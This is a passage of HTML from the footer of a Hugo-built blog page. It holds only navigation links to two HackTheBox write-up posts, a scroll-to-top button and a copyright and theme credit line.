            <a class="group flex" href="/blog/hunting/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HackTheBox Pwn: Hunting</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2021-02-13 00:00:00 &#43;0000 UTC">13 February 2021</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/blog/precious-htb/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HackTheBox - Precious</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-05-20 00:00:00 &#43;0000 UTC">20 May 2023</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2024
            
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>

    </div>
  </body>
</html>
